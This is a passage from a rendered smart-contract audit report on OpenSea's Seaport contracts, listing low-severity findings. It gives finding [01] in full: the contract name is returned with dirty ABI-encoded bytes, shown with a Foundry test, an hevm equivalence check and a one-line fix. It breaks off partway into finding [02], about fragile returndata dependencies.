<code>_performERC1155BatchTransfers</code> consumes all gas on invalid input</li>\n<li><strong>[04]</strong> Hardcoded values in <code>_validateAndFulfillBasicOrder()</code></li>\n<li><strong>[05]</strong> Helpers should have their expectations explained in NatSpec/comments</li>\n<li><strong>[06]</strong> <code>ConduitTransfer</code> identifier field can be dirty and unused</li>\n<li><strong>[07]</strong> Inconsistent way to return values in <code>_verifyTime()</code> and <code>_verifyOrderStatus</code></li>\n<li><strong>[08]</strong> <code>_callConduitUsingOffsets</code> depends on compiler behaviour for inter-assembly-block cleanup</li>\n<li><strong>[09]</strong> <code>Assertions.sol</code> is missing an assertion about bounds for array length</li>\n<li><strong>[10]</strong> LowLevelHelpers enforce a stricter ABI standard for <code>returndatasize</code></li>\n<li><strong>[11]</strong> <code>_assertValidSignature</code> allows malleable <code>secp256k1</code> signatures</li>\n<li><strong>[12]</strong> The memory cost calculation logic <code>_revertWithReasonIfOneIsReturned</code> is duplicated in multiple places</li>\n<li><strong>[13]</strong> Accumulator code depends on memory usage</li>\n<li><strong>[14]</strong> Doing a basic order twice gives a misleading error message</li>\n<li><strong>[15]</strong> Orders with moving price and <code>endTime = type(uint).max</code> can never be fulfilled</li>\n<li><strong>[16]</strong> <code>_prepareBasicFulfillmentFromCalldata</code> overwrites memory extensively</li>\n<li><strong>[17]</strong> Parameters passed to <code>fulfillBasicOrder()</code> insufficiently checked</li>\n<li><strong>[18]</strong> <code>startAmount</code> and <code>endAmount</code> being different would severely limit partial orders </li>\n<li><strong>[19]</strong> SafeTransferFrom: <code>transferFrom</code> to precompiles may succeed, a deviation from OZ’s implementation</li>\n<li><strong>[20]</strong> The gas computation for memory expansion rounds down instead of rounding up </li>\n<li><strong>[21]</strong> <code>TokenTransferrer._performERC1155BatchTransfers</code> leaves corrupted memory</li>\n<li><strong>[22]</strong> <code>_triggerIfArmed()</code> done outside of reentrancy guards</li>\n<li><strong>[23]</strong> Deviations between Solidity compiler’s checks and seaport’s checks in <code>validateOrderParameters</code> </li>\n</ul>\n<h2 id=\"01-the-function-_name-returns-dirty-data\" style=\"position:relative;\"><a href=\"#01-the-function-_name-returns-dirty-data\" aria-label=\"01 the function _name returns dirty data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] The function <code>_name()</code> returns dirty data</h2>\n<p><strong>Context:</strong> <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/Seaport.sol#L41\">Seaport.sol#L41</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/ConsiderationBase.sol#L100\">ConsiderationBase.sol#L100</a></p>\n<p>The function <code>name()</code> of Seaport.sol returns dirty data.<br>\nThis may create issues with frontends that expect clean data. In fact, Etherscan is having trouble decoding it!<br>\n<a href=\"https://etherscan.io/address/0x00000000006cee72100d161c57ada5bb2be1ca79#readContract\">https://etherscan.io/address/0x00000000006cee72100d161c57ada5bb2be1ca79#readContract</a> and click name! There is a junk character at the end.<br>\n<img width=\"108\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5469459/169769394-21818bb9-d85f-459d-b276-d4cdd190ee35.png\"></p>\n<p>This also could have negative impact on composability.</p>\n<p>The external function <code>name()</code> gets its value from <code>_name()</code> in contract Seaport.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ReferenceConsideration</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ConsiderationInterface</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReferenceOrderCombiner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contractName</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">contractName</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_name</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Seaport</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Consideration</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return the name of the contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x20</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x27</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x07536561706f7274</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x60</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Function <code>_name()</code> is supposed to return “Seaport”. The ABI encoded data has offset as the first 32 bytes (<code>0x20</code> is the offset). The offset has info length <code>7</code> followed by “Seaport” (<code>0x536561706f7274</code> but padded with zeros on the right).</p>\n<p>Properly encoded data would look like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">0000000000000000000000000000000000000000000000000000000000000020</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0000000000000000000000000000000000000000000000000000000000000007</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">536561706f727400000000000000000000000000000000000000000000000000</span></span></code></pre>\n<p>The final <code>mstore(0x27, ...)</code> only writes to memory regions <code>[0x29, 0x49)</code>. The remainder will likely contain junk. You can expect the actual data to be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">0000000000000000000000000000000000000000000000000000000000000020</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0000000000000000000000000000000000000000000000000000000000000007</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">536561706f72740?????????????????????????????????????????????????</span></span></code></pre>\n<p>Because <code>0x40</code> points to the free memory pointer, you can expect the value <code>mload(0x40)</code> to be a relatively small number. So only the last few least significant bits would be set, with the rest to be <code>0</code> in usual cases. </p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">modified   test/foundry/FulfillBasicOrderTest.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -32,6 +32,25 @@ contract FulfillBasicOrderTest is BaseOrderTest {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint128 tokenAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function testName() public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        string memory name = consideration.name();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint rds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint a;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint b;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes32 c;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            rds := returndatasize()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            returndatacopy(mload(0x40), 0, returndatasize())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            a := mload(mload(0x40))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            b := mload(add(mload(0x40), 32))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            c := mload(add(mload(0x40), 64))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;returndatasize: &quot;, rds);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;offset: &quot;, a);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_uint(&quot;length: &quot;, b);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit log_named_bytes32(&quot;data: &quot;, c);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span></code></pre>\n<p>returns:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  returndatasize: : 96</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  offset: : 32</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  length: : 13</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  data: : 0x436f6e73696465726174696f6e00000000000000000000000000000000000080</span></span></code></pre>\n<p>The final <code>80</code> character is the initial value of the free memory pointer!</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Clean the last word properly. This requires an additional <code>mstore</code>.</p>\n<h4 id=\"hevm-confirmation\" style=\"position:relative;\"><a href=\"#hevm-confirmation\" aria-label=\"hevm confirmation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HEVM confirmation</h4>\n<p>hevm confirms this.<br>\nFile 1:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Seaport</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">f</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_name</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return the name of the contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x20</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x27</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x07536561706f7274</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x60</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>File 2:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Seaport</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">f</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_nameString</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_nameString</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return the name of the contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;Seaport&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Run:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">hevm equivalence --code-a $(cat seaport1.bin) --code-b $(cat seaport2.bin)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Not equal!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Counterexample:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Calldata:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0x26121ff0000000000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Caller:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0x0000000000000000000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Callvalue:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">0</span></span></code></pre>\n<p>Adding <code>mstore(0x49, 0x00)</code> before the return in the first version makes it work:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">hevm equivalence --code-a $(cat seaport1.bin) --code-b $(cat seaport2.bin)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Explored: 4 execution paths of A and: 4 paths of B.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">No discrepancies found.</span></span></code></pre>\n<h2 id=\"02-_revertwithreasonifoneisreturned-_doesnotmatchmagic-and-_assertisvalidorderstaticcallsuccess-have-a-fragile-dependency-on-call-order\" style=\"position:relative;\"><a href=\"#02-_revertwithreasonifoneisreturned-_doesnotmatchmagic-and-_assertisvalidorderstaticcallsuccess-have-a-fragile-dependency-on-call-order\" aria-label=\"02 _revertwithreasonifoneisreturned _doesnotmatchmagic and _assertisvalidorderstaticcallsuccess have a fragile dependency on call order permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] <code>_revertWithReasonIfOneIsReturned</code>, <code>_doesNotMatchMagic</code> (and <code>_assertIsValidOrderStaticcallSuccess</code>) have a fragile dependency on call order</h2>\n<p>These helper functions rely on the undisturbed contents returned by <code>returndatasize</code>/<code>returndatacopy</code>. Should the call sites undergo some changes, they may not function as intended. They are used in numerous functions.</p>\n<p>This is further complicated in <code>_assertIsValidOrderStaticcallSuccess</code> which is another layer hiding this assumption.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L46\">LowLevelHelpers.sol#L46</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L103\">LowLevelHelpers.sol#L103</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/ZoneInteraction.sol#L157\">ZoneInteraction.sol#L157</a></p>\n<p>Issues can arise if:</p>\n<ol>\n<li>The order of these helpers change and some other call is performed</li>\n<li>These helpers become non-internal library functions (because then a call is performed and in the new context the buffer is empty)</li>\n</ol>\n<p>An example use case is below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Transfer the ETH and store if it succeeded or not.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            success := </span><span class=\"mtk11\">call</span><span class=\"mtk1\">(</span><span class=\"mtk11\">gas</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk3\">// &lt;-- Do something here to disturb the returndata buffer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 